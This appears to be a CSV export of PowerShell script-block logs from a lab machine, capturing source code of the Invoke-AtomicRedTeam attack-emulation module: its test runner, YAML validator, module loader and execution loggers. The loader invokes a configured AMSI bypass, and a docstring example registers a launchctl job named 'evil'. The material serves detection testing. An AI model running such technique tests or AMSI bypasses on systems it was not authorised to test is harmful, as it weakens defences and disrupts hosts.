                $commandLine = ""$commandLine -GetPrereqs $GetPrereqs""
            }

            if ($Cleanup -ne $false) {
                $commandLine = ""$commandLine -Cleanup $Cleanup""
            }

            if ($NoExecutionLog -ne $false) {
                $commandLine = ""$commandLine -NoExecutionLog $NoExecutionLog""
            }

            $commandLine = ""$commandLine -ExecutionLogPath $ExecutionLogPath""

            if ($Force -ne $false) {
                $commandLine = ""$commandLine -Force $Force""
            }

            if ($InputArgs -ne $null) {
                $commandLine = ""$commandLine -InputArgs $InputArgs""
            }

            $commandLine = ""$commandLine -TimeoutSeconds $TimeoutSeconds""
            if ($PSBoundParameters.ContainsKey('Session')) {
                if ( $null -eq $Session ) {
                    Write-Error ""The provided session is null and cannot be used.""
                    continue
                }
                else {
                    $commandLine = ""$commandLine -Session $Session""
                }
            }

            if ($Interactive -ne $false) {
                $commandLine = ""$commandLine -Interactive $Interactive""
            }

            if ($KeepStdOutStdErrFiles -ne $false) {
                $commandLine = ""$commandLine -KeepStdOutStdErrFiles $KeepStdOutStdErrFiles""
            }

            if ($null -ne $LoggingModule) {
                $commandLine = ""$commandLine -LoggingModule $LoggingModule""
            }

            $startTime = Get-Date
            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {
                &""$_\Start-ExecutionLog"" $startTime $ExecutionLogPath $executionHostname $executionUser $commandLine (-Not($IsLinux -or $IsMacOS))
            }
        }

        function Platform-IncludesCloud {
            $cloud = ('office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')
            foreach ($platform in $test.supported_platforms) {
                if ($cloud -contains $platform) {
                    return $true
                }
            }
            return $false
        }

        function Test-IncludesTerraform($AT, $testCount) {
            $AT = $AT.ToUpper()
            $pathToTerraform = Join-Path $PathToAtomicsFolder ""\$AT\src\$AT-$testCount\$AT-$testCount.tf""
            $cloud = ('iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')
            foreach ($platform in $test.supported_platforms) {
                if ($cloud -contains $platform) {
                    return $(Test-Path -Path $pathToTerraform)
                }
            }
            return $false
        }

        function Build-TFVars($AT, $testCount, $InputArgs) {
            $tmpDirPath = Join-Path $PathToAtomicsFolder ""\$AT\src\$AT-$testCount""
            if ($InputArgs) {
                $destinationVarsPath = Join-Path ""$tmpDirPath"" ""terraform.tfvars.json""
                $InputArgs | ConvertTo-Json | Out-File -FilePath $destinationVarsPath
            }
        }

        function Remove-TerraformFiles($AT, $testCount) {
            $tmpDirPath = Join-Path $PathToAtomicsFolder ""\$AT\src\$AT-$testCount""
            Write-Host $tmpDirPath
            $tfStateFile = Join-Path $tmpDirPath ""terraform.tfstate""
            $tfvarsFile = Join-Path $tmpDirPath ""terraform.tfvars.json""
            if ($(Test-Path $tfvarsFile)) {
                Remove-Item -LiteralPath $tfvarsFile -Force
            }
            if ($(Test-Path $tfStateFile)) {
                (Get-ChildItem -Path $tmpDirPath).Fullname -match ""terraform.tfstate*"" | Remove-Item -Force
            }
        }

        function Invoke-AtomicTestSingle ($AT) {

            $AT = $AT.ToUpper()
            $pathToYaml = Join-Path $PathToAtomicsFolder ""\$AT\$AT.yaml""
            if (Test-Path -Path $pathToYaml) { $AtomicTechniqueHash = Get-AtomicTechnique -Path $pathToYaml }
            else {
                Write-Host -Fore Red ""ERROR: $PathToYaml does not exist`nCheck your Atomic Number and your PathToAtomicsFolder parameter""
                return
            }
            $techniqueCount = 0
            $numAtomicsApplicableToPlatform = 0
            $techniqueString = """"
            foreach ($technique in $AtomicTechniqueHash) {
                $techniqueString = $technique.attack_technique[0]
                $techniqueCount++

                $props = @{
                    Activity        = ""Running $($technique.display_name.ToString()) Technique""
                    Status          = 'Progress:'
                    PercentComplete = ($techniqueCount / ($AtomicTechniqueHash).Count * 100)
                }
                Write-Progress @props

                Write-Debug -Message ""Gathering tests for Technique $technique""

                $testCount = 0
                foreach ($test in $technique.atomic_tests) {

                    Write-Verbose -Message 'Determining tests for target platform'

                    $testCount++

                    if (-not $anyOS) {
                        if ( -not $(Platform-IncludesCloud) -and -Not $test.supported_platforms.Contains($executionPlatform) ) {
                            Write-Verbose -Message ""Unable to run non-$executionPlatform tests""
                            continue
                        }

                        if ( $executionPlatform -eq ""windows"" -and ($test.executor.name -eq ""sh"" -or $test.executor.name -eq ""bash"")) {
                            Write-Verbose -Message ""Unable to run sh or bash on $executionPlatform""
                            continue
                        }
                        if ( (""linux"", ""macos"") -contains $executionPlatform -and $test.executor.name -eq ""command_prompt"") {
                            Write-Verbose -Message ""Unable to run cmd.exe on $executionPlatform""
                            continue
                        }
                    }


                    if ($null -ne $TestNumbers) {
                        if (-Not ($TestNumbers -contains $testCount) ) { continue }
                    }

                    if ($null -ne $TestNames) {
                        if (-Not ($TestNames -contains $test.name) ) { continue }
                    }

                    if ($null -ne $TestGuids) {
                        if (-Not ($TestGuids -contains $test.auto_generated_guid) ) { continue }
                    }

                    $props = @{
                        Activity        = 'Running Atomic Tests'
                        Status          = 'Progress:'
                        PercentComplete = ($testCount / ($technique.atomic_tests).Count * 100)
                    }
                    Write-Progress @props

                    Write-Verbose -Message 'Determining manual tests'

                    if ($test.executor.name.Contains('manual')) {
                        Write-Verbose -Message 'Unable to run manual tests'
                        continue
                    }
                    $numAtomicsApplicableToPlatform++

                    $testId = ""$AT-$testCount $($test.name)""
                    if ($ShowDetailsBrief) {
                        Write-KeyValue $testId
                        continue
                    }

                    if ($PromptForInputArgs) {
                        $InputArgs = Invoke-PromptForInputArgs $test.input_arguments
                    }

                    if ($ShowDetails) {
                        Show-Details $test $testCount $technique $InputArgs $PathToPayloads
                        continue
                    }

                    Write-Debug -Message 'Gathering final Atomic test command'


                    if ($CheckPrereqs) {
                        Write-KeyValue ""CheckPrereq's for: "" $testId
                        $failureReasons = Invoke-CheckPrereqs $test $isElevated $executionPlatform $InputArgs $PathToPayloads $TimeoutSeconds $session
                        Write-PrereqResults $FailureReasons $testId
                    }
                    elseif ($GetPrereqs) {
                        if ($(Test-IncludesTerraform $AT $testCount)) {
                            Build-TFVars $AT $testCount $InputArgs
                        }
                        Write-KeyValue ""GetPrereq's for: "" $testId
                        if ( $test.executor.elevation_required -and -not $isElevated) {
                            Write-Host -ForegroundColor Red ""Elevation required but not provided""
                        }
                        if ($nul -eq $test.dependencies) { Write-KeyValue ""No Preqs Defined""; continue }
                        foreach ($dep in $test.dependencies) {
                            $executor = Get-Prereq","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","2",""
"12/16/2024 8:34:54 PM","35710553","1",", Get","Get [Score: 1]","5827","Executor $test
                            $description = (Merge-InputArgs $dep.description $test $InputArgs $PathToPayloads).trim()
                            Write-KeyValue  ""Attempting to satisfy prereq: "" $description
                            $final_command_prereq = Merge-InputArgs $dep.prereq_command $test $InputArgs $PathToPayloads
                            if ($executor -ne ""powershell"") { $final_command_prereq = ($final_command_prereq.trim()).Replace(""`n"", "" && "") }
                            $final_command_get_prereq = Merge-InputArgs $dep.get_prereq_command $test $InputArgs $PathToPayloads
                            $res = Invoke-ExecuteCommand $final_command_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$true

                            if ($res.ExitCode -eq 0) {
                                Write-KeyValue ""Prereq already met: "" $description
                            }
                            else {
                                $res = Invoke-ExecuteCommand $final_command_get_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive
                                $res = Invoke-ExecuteCommand $final_command_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$true
                                if ($res.ExitCode -eq 0) {
                                    Write-KeyValue ""Prereq successfully met: "" $description
                                }
                                else {
                                    Write-Host -ForegroundColor Red ""Failed to meet prereq: $description""
                                }
                            }
                        }
                    }
                    elseif ($Cleanup) {
                        Write-KeyValue ""Executing cleanup for test: "" $testId
                        $final_command = Merge-InputArgs $test.executor.cleanup_command $test $InputArgs $PathToPayloads
                        if (Get-Command 'Invoke-ARTPreAtomicCleanupHook' -errorAction SilentlyContinue) { Invoke-ARTPreAtomicCleanupHook $test $InputArgs }
                        $res = Invoke-ExecuteCommand $final_command $test.executor.name $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive
                        Write-KeyValue ""Done executing cleanup for test: "" $testId
                        if (Get-Command 'Invoke-ARTPostAtomicCleanupHook' -errorAction SilentlyContinue) { Invoke-ARTPostAtomicCleanupHook $test $InputArgs }
                        if ($(Test-IncludesTerraform $AT $testCount)) {
                            Remove-TerraformFiles $AT $testCount
                        }
                    }
                    else {
                        Write-KeyValue ""Executing test: "" $testId
                        $startTime = Get-Date
                        $final_command = Merge-InputArgs $test.executor.command $test $InputArgs $PathToPayloads
                        if (Get-Command 'Invoke-ARTPreAtomicHook' -errorAction SilentlyContinue) { Invoke-ARTPreAtomicHook $test $InputArgs }
                        $res = Invoke-ExecuteCommand $final_command $test.executor.name $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive
                        Write-Host ""Exit code: $($res.ExitCode)""
                        if (Get-Command 'Invoke-ARTPostAtomicHook' -errorAction SilentlyContinue) { Invoke-ARTPostAtomicHook $test $InputArgs }
                        $stopTime = Get-Date
                        if ($isLoggingModuleSet) {
                            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {
                                &""$_\Write-ExecutionLog"" $startTime $stopTime $AT $testCount $test.name $test.auto_generated_guid $test.executor.name $test.description $final_command $ExecutionLogPath $executionHostname $executionUser $res (-Not($IsLinux -or $IsMacOS))
                            }
                        }
                        Write-KeyValue ""Done executing test: "" $testId
                    }

                } # End of foreach Test in single Atomic Technique
            } # End of foreach Technique in Atomic Tests
            if ($numAtomicsApplicableToPlatform -eq 0) {
                Write-Host -ForegroundColor Yellow ""Found $numAtomicsApplicableToPlatform atomic tests applicable to $executionPlatform platform for Technique $techniqueString""
            }
        } # End of Invoke-AtomicTestSingle function

        if ($AtomicTechnique -eq ""All"") {
            function Invoke-AllTests() {
                $AllAtomicTests = New-Object System.Collections.ArrayList
                Get-ChildItem $PathToAtomicsFolder -Directory -Filter T* | ForEach-Object {
                    $currentTechnique = [System.IO.Path]::GetFileName($_.FullName)
                    if ( $currentTechnique -match ""T[0-9]{4}.?([0-9]{3})?"" ) { $AllAtomicTests.Add($currentTechnique) | Out-Null }
                }
                $AllAtomicTests.GetEnumerator() | Foreach-Object { Invoke-AtomicTestSingle $_ }
            }

            if ( ($Force -or $CheckPrereqs -or $ShowDetails -or $ShowDetailsBrief -or $GetPrereqs) -or $psCmdlet.ShouldContinue( 'Do you wish to execute all tests?',
                    ""Highway to the danger zone, Executing All Atomic Tests!"" ) ) {
                Invoke-AllTests
            }
        }
        else {
            Invoke-AtomicTestSingle $AtomicTechnique
        }

        if ($isLoggingModuleSet) {
            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {
                &""$_\Stop-ExecutionLog"" $startTime $ExecutionLogPath $executionHostname $executionUser (-Not($IsLinux -or $IsMacOS))
            }
        }

    } # End of PROCESS block
    END { } # Intentionally left blank and can be removed
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","2","2",""
"12/16/2024 8:34:57 PM","35711056","1",", Get","Get [Score: 1]","10667","filter Get-AtomicTechnique {
    <#
    .SYNOPSIS

    Retrieve and validate an atomic technique.

    .DESCRIPTION

    Get-AtomicTechnique retrieves and validates one or more atomic techniques. Get-AtomicTechnique supports retrieval from YAML files or from a raw YAML string.

    This function facilitates the following use cases:

    1) Validation prior to execution of atomic tests.
    2) Writing code to reason over one or more atomic techniques/tests.
    3) Representing atomic techniques/tests in a format that is more conducive to PowerShell. ConvertFrom-Yaml returns a large, complicated hashtable that is difficult to work with and reason over. Get-AtomicTechnique helps abstract those challenges away.
    4) Representing atomic techniques/tests in a format that can be piped directly to ConvertTo-Yaml.

    .PARAMETER Path

    Specifies the path to an atomic technique YAML file. Get-AtomicTechnique expects that the file extension be .yaml or .yml and that it is well-formed YAML content.

    .PARAMETER Yaml

    Specifies a single string consisting of raw atomic technique YAML.

    .EXAMPLE

    Get-ChildItem -Path C:\atomic-red-team\atomics\* -Recurse -Include 'T*.yaml' | Get-AtomicTechnique

    .EXAMPLE

    Get-Item C:\atomic-red-team\atomics\T1117\T1117.yaml | Get-AtomicTechnique

    .EXAMPLE

    Get-AtomicTechnique -Path C:\atomic-red-team\atomics\T1117\T1117.yaml

    .EXAMPLE

    $Yaml = @'
    ---
    attack_technique: T1152
    display_name: Launchctl

    atomic_tests:
    - name: Launchctl
      description: |
        Utilize launchctl

      supported_platforms:
        - macos

      executor:
        name: sh
        command: |
          launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator
    '@

    Get-AtomicTechnique -Yaml $Yaml

    .INPUTS

    System.IO.FileInfo

    The output of Get-Item and Get-ChildItem can be piped directly into Get-AtomicTechnique.

    .OUTPUTS

    AtomicTechnique

    Outputs an object representing a parsed and validated atomic technique.
    #>

    [CmdletBinding(DefaultParameterSetName = 'FilePath')]
    [OutputType([AtomicTechnique])]
    param (
        [Parameter(Mandatory, ValueFromPipelineByPropertyName, ParameterSetName = 'FilePath')]
        [String]
        [Alias('FullName')]
        [ValidateScript({ Test-Path -Path $_ -Include '*.yaml', '*.yml' })]
        $Path,

        [Parameter(Mandatory, ParameterSetName = 'Yaml')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Yaml
    )


    switch ($PSCmdlet.ParameterSetName) {
        'FilePath' {
            $ResolvedPath = Resolve-Path -Path $Path

            $YamlContent = Get-Content -Path $ResolvedPath -Raw
            $ErrorStringPrefix = ""[$($ResolvedPath)]""
        }

        'Yaml' {
            $YamlContent = $Yaml
            $ErrorStringPrefix = ''
        }
    }

    $ParsedYaml = $null

    $ValidSupportedPlatforms = @('windows', 'macos', 'linux', 'office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')
    $ValidInputArgTypes = @('Path', 'Url', 'String', 'Integer', 'Float')
    $ValidExecutorTypes = @('command_prompt', 'sh', 'bash', 'powershell', 'manual', 'aws', 'az', 'gcloud', 'kubectl')

    # ConvertFrom-Yaml will throw a .NET exception rather than a PowerShell error.
    # Capture the exception and convert to PowerShell error so that the user can decide
    # how to handle the error.
    try {
        [Hashtable] $ParsedYaml = ConvertFrom-Yaml -Yaml $YamlContent
    }
    catch {
        Write-Error $_
    }

    if ($ParsedYaml) {
        # The document was well-formed YAML. Now, validate against the atomic red schema

        $AtomicInstance = [AtomicTechnique]::new()

        if (-not $ParsedYaml.Count) {
            Write-Error ""$ErrorStringPrefix YAML file has no elements.""
            return
        }

        if (-not $ParsedYaml.ContainsKey('attack_technique')) {
            Write-Error ""$ErrorStringPrefix 'attack_technique' element is required.""
            return
        }

        $AttackTechnique = $null

        if ($ParsedYaml['attack_technique'].Count -gt 1) {
            # An array of attack techniques are supported.
            foreach ($Technique in $ParsedYaml['attack_technique']) {
                if (""$Technique"" -notmatch '^(?-i:T\d{4}(\.\d{3}){0,1})$') {
                    Write-Warning ""$ErrorStringPrefix Attack technique: $Technique. Each attack technique should start with the letter 'T' followed by a four digit number.""
                }

                [String[]] $AttackTechnique = $ParsedYaml['attack_technique']
            }
        }
        else {
            if ((-not ""$($ParsedYaml['attack_technique'])"".StartsWith('T'))) {
                # If the attack technique is a single entry, validate that it starts with the letter T.
                Write-Warning ""$ErrorStringPrefix Attack technique: $($ParsedYaml['attack_technique']). Attack techniques should start with the letter T.""
            }

            [String] $AttackTechnique = $ParsedYaml['attack_technique']
        }

        $AtomicInstance.attack_technique = $AttackTechnique

        if (-not $ParsedYaml.ContainsKey('display_name')) {
            Write-Error ""$ErrorStringPrefix 'display_name' element is required.""
            return
        }

        if (-not ($ParsedYaml['display_name'] -is [String])) {
            Write-Error ""$ErrorStringPrefix 'display_name' must be a string.""
            return
        }

        $AtomicInstance.display_name = $ParsedYaml['display_name']

        if (-not $ParsedYaml.ContainsKey('atomic_tests')) {
            Write-Error ""$ErrorStringPrefix 'atomic_tests' element is required.""
            return
        }

        if (-not ($ParsedYaml['atomic_tests'] -is [System.Collections.Generic.List`1[Object]])) {
            Write-Error ""$ErrorStringPrefix 'atomic_tests' element must be an array.""
            return
        }

        $AtomicTests = [AtomicTest[]]::new($ParsedYaml['atomic_tests'].Count)

        if (-not $ParsedYaml['atomic_tests'].Count) {
            Write-Error ""$ErrorStringPrefix 'atomic_tests' element is empty - you have no tests.""
            return
        }

        for ($i = 0; $i -lt $ParsedYaml['atomic_tests'].Count; $i++) {
            $AtomicTest = $ParsedYaml['atomic_tests'][$i]

            $AtomicTestInstance = [AtomicTest]::new()

            $StringsWithPotentialInputArgs = New-Object -TypeName 'System.Collections.Generic.List`1[String]'

            if (-not $AtomicTest.ContainsKey('name')) {
                Write-Error ""$ErrorStringPrefix 'atomic_tests[$i].name' element is required.""
                return
            }

            if (-not ($AtomicTest['name'] -is [String])) {
                Write-Error ""$ErrorStringPrefix 'atomic_tests[$i].name' element must be a string.""
                return
            }

            $AtomicTestInstance.name = $AtomicTest['name']
            $AtomicTestInstance.auto_generated_guid = $AtomicTest['auto_generated_guid']

            if (-not $AtomicTest.ContainsKey('description')) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description' element is required.""
                return
            }

            if (-not ($AtomicTest['description'] -is [String])) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description' element must be a string.""
                return
            }

            $AtomicTestInstance.description = $AtomicTest['description']

            if (-not $AtomicTest.ContainsKey('supported_platforms')) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms' element is required.""
                return
            }

            if (-not ($AtomicTest['supported_platforms'] -is [System.Collections.Generic.List`1[Object]])) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms' element must be an array.""
                return
            }

            foreach ($SupportedPlatform in $AtomicTest['supported_platforms']) {
                if ($ValidSupportedPlatforms -cnotcontains $SupportedPlatform) {
                    Write-Warning ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms': '$SupportedPlatform' must be one of the following: $($ValidSupportedPlatforms -join ', ').""
                }
            }

            $AtomicTestInstance.supported_platforms = $AtomicTest['supported_platforms']

            $Dependencies = $null

            if ($AtomicTest['dependencies'].Count) {
                $Dependencies = [AtomicDependency[]]::new($AtomicTest['dependencies'].Count)
                $j = 0

                # dependencies are optional and there can be multiple
                foreach ($Dependency in $AtomicTest['dependencies']) {
                    $DependencyInstance = [AtomicDependency]::new()

                    if (-not $Dependency.ContainsKey('description')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].description' element is required.""
                        return
                    }

                    if (-not ($Dependency['description'] -is [String])) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].description' element must be a string.""
                        return
                    }

                    $DependencyInstance.description = $Dependency['description']
                    $StringsWithPotentialInputArgs.Add($Dependency['description'])

                    if (-not $Dependency.ContainsKey('prereq_command')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].prereq_command' element is required.""
                        return
                    }

                    if (-not ($Dependency['prereq_command'] -is [String])) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].prereq_command' element must be a string.""
                        return
                    }

                    $DependencyInstance.prereq_command = $Dependency['prereq_command']
                    $Str","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","3",""
"12/16/2024 8:34:54 PM","35710562","1",", Get","Get [Score: 1]","426","function Invoke-KillProcessTree {
    Param([int]$ppid)
    if ($IsLinux -or $IsMacOS) {
        sh -c ""pkill -9 -P $ppid""
    }
    else {
        while ($null -ne ($gcim = Get-CimInstance Win32_Process | Where-Object { $_.ParentProcessId -eq $ppid })) {
            $gcim | ForEach-Object { Invoke-KillProcessTree $_.ProcessId; Start-Sleep -Seconds 0.5 }
        }
        Stop-Process -Id $ppid -ErrorAction Ignore
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711050","1",", Get","Get [Score: 1]","847","#requires -Version 5.0

# execute amsi bypass if configured to use one
if([bool]$artConfig.absb -and ($artConfig.OS -eq ""windows"")){
    $artConfig.absb.Invoke()
}

#Get public and private function definition files.
$Public = @( Get-ChildItem -Path $PSScriptRoot\Public\*.ps1 -Recurse -Exclude AtomicRunnerService.ps1 -ErrorAction SilentlyContinue )
$Private = @( Get-ChildItem -Path $PSScriptRoot\Private\*.ps1 -Recurse -Exclude ""AtomicClassSchema.ps1"" -ErrorAction SilentlyContinue )

# Make sure the Atomic Class Schema is available first (a workaround so PSv5.0 doesn't give errors)
. ""$PSScriptRoot\Private\AtomicClassSchema.ps1""

#Dot source the files
Foreach ($import in @($Public + $Private)) {
    Try {
        . $import.fullname
    }
    Catch {
        Write-Error -Message ""Failed to import function $($import.fullname): $_""
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711047","1",", Get","Get [Score: 1]","1654","function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {
    if ($isWindows -and -not [System.Diagnostics.EventLog]::Exists('Atomic Red Team')) {
        New-EventLog -Source ""Applications and Services Logs"" -LogName ""Atomic Red Team""
    }
}

function Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {
    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $timeLocal = (Get-Date($startTime) -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $ipAddress = Get-PreferredIPAddress $isWindows

    $msg = [PSCustomObject][ordered]@{
        ""Execution Time (UTC)""   = $timeUTC
        ""Execution Time (Local)"" = $timeLocal
        ""Technique""              = $technique
        ""Test Number""            = $testNum
        ""Test Name""              = $testName
        ""Hostname""               = $targetHostname
        ""IP Address""             = $ipAddress
        ""Username""               = $targetUser
        ""GUID""                   = $testGuid
        ""Tag""                    = ""atomicrunner""
        ""CustomTag""              = $artConfig.CustomTag
        ""ProcessId""              = $res.ProcessId
        ""ExitCode""               = $res.ExitCode
    }

    Write-EventLog  -Source ""Applications and Services Logs"" -LogName ""Atomic Red Team"" -EventID 3001 -EntryType Information -Message $msg -Category 1 -RawData 10, 20
}

function Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {

}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711044","1",", Get","Get [Score: 1]","1699","function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {

}

function Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {
    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $timeLocal = (Get-Date($startTime) -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $ipAddress = Get-PreferredIPAddress $isWindows

    $msg = [PSCustomObject][ordered]@{
        ""Execution Time (UTC)""   = $timeUTC
        ""Execution Time (Local)"" = $timeLocal
        ""Technique""              = $technique
        ""Test Number""            = $testNum
        ""Test Name""              = $testName
        ""Hostname""               = $targetHostname
        ""IP Address""             = $ipAddress
        ""Username""               = $targetUser
        ""GUID""                   = $testGuid
        ""Tag""                    = ""atomicrunner""
        ""CustomTag""              = $artConfig.CustomTag
        ""ProcessId""              = $res.ProcessId
        ""ExitCode""               = $res.ExitCode
    }

    # send syslog message if a syslog server is defined in Public/config.ps1
    if ([bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {
        $jsonMsg = $msg | ConvertTo-Json -Compress
        Send-SyslogMessage -Server $artConfig.syslogServer -Port $artConfig.syslogPort -Message $jsonMsg -Severity ""Informational"" -Facility ""daemon"" -Transport $artConfig.syslogProtocol
    }
}

function Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {

}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711041","1",", Get","Get [Score: 1]","6031","# Attire-ExecutionLogger.psm1
# Copyright 2023 Security Risk Advisors

# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the Software),
# to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED AS IS, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
#  WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

$script:attireLog = [PSCustomObject]@{
    'attire-version' = '1.1'
    'execution-data' = ''
    'procedures'     = @()
}

function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {

    $ipAddress = Get-PreferredIPAddress $isWindows

    if ($targetUser -isnot [string]) {
        if ([bool]($targetUser.PSobject.Properties.name -match ""^value$"")) {
            $targetUser = $targetUser.value
        }
        else {
            $targetUser = $targetUser.ToString()
        }
    }
    if ($targetHostname -isnot [string]) {
        if ([bool]($targetHostname.PSobject.Properties.name -match ""^value$"")) {
            $targetHostname = $targetHostname.value
        }
        else {
            $targetHostname = $targetHostname.ToString()
        }
    }

    $target = [PSCustomObject]@{
        user = $targetUser
        host = $targetHostname
        ip   = $ipAddress
        path = $Env:PATH
    }

    $guid = New-Guid
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($guid.Guid)
    $executionId = [Convert]::ToBase64String($bytes)

    $executionCategory = [PSCustomObject]@{
        'name'         = ""Atomic Red Team""
        'abbreviation' = ""ART""
    }

    $executionData = [PSCustomObject]@{
        'execution-source'   = ""Invoke-Atomicredteam""
        'execution-id'       = $executionId
        'execution-category' = $executionCategory
        'execution-command'  = $commandLine
        target               = $target
        'time-generated'     = """"
    }

    $script:attireLog.'execution-data' = $executionData
}

function Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {

    $startTime = (Get-Date($startTime).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z').ToString()
    $stopTime = (Get-Date($stopTime).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z').ToString()

    $procedureId = [PSCustomObject]@{
        type = ""guid""
        id   = $testGuid
    }

    $step = [PSCustomObject]@{
        'order'      = 1
        'time-start' = $startTime
        'time-stop'  = $stopTime
        'executor'   = $testExecutor
        'command'    = $command
        'process-id' = $res.ProcessId
        'exit-code'  = $res.ExitCode
        'is-timeout' = $res.IsTimeout
        'output'     = @()
    }

    $stdOutContents = $res.StandardOutput
    if (($stdOutContents -isnot [string]) -and ($null -ne $stdOutContents)) {
        $stdOutContents = $stdOutContents.ToString()
    }

    $outputStdConsole = [PSCustomObject]@{
        content = $stdOutContents
        level   = ""STDOUT""
        type    = ""console""
    }

    $stdErrContents = $res.ErrorOutput
    if (($stdErrContents -isnot [string]) -and ($null -ne $stdErrContents)) {
        $stdErrContents = $stdErrContents.ToString()
    }

    $outputErrConsole = [PSCustomObject]@{
        content = $stdErrContents
        level   = ""STDERR""
        type    = ""console""
    }

    [bool] $foundOutput = $false
    if ($res.StandardOutput.length -gt 0) {
        $foundOutput = $true
        $step.output += $outputStdConsole
    }

    if ($res.ErrorOutput.length -gt 0) {
        $foundOutput = $true
        $step.output += $outputErrConsole
    }

    if (!$foundOutput) {
        $emptyOutput = [PSCustomObject]@{
            content = """"
            level   = ""STDOUT""
            type    = ""console""
        }
        $step.output += $emptyOutput
    }

    $procedure = [PSCustomObject]@{
        'mitre-technique-id'    = $technique
        'procedure-name'        = $testName
        'procedure-id'          = $procedureId
        'procedure-description' = $testDescription
        order                   = $testNum
        steps                   = @()
    }

    $procedure.steps += $step

    $script:attireLog.procedures += $procedure
}

function Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {
    $script:attireLog.'execution-data'.'time-generated' = (Get-Date (Get-Date).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z')
    #$script:attireLog | Export-Csv -Path ""attireLogObject.csv""
    $content = ($script:attireLog | ConvertTo-Json -Depth 12)
    #$Utf8NoBom = New-Object System.Text.UTF8Encoding $False
    [System.IO.File]::WriteAllLines((Resolve-NonexistantPath($logPath)), $content)
    #Out-File -FilePath $logPath -InputObject ($script:attireLog | ConvertTo-Json -Depth 12) -Append -Encoding ASCII
    $script:attireLog = [PSCustomObject]@{
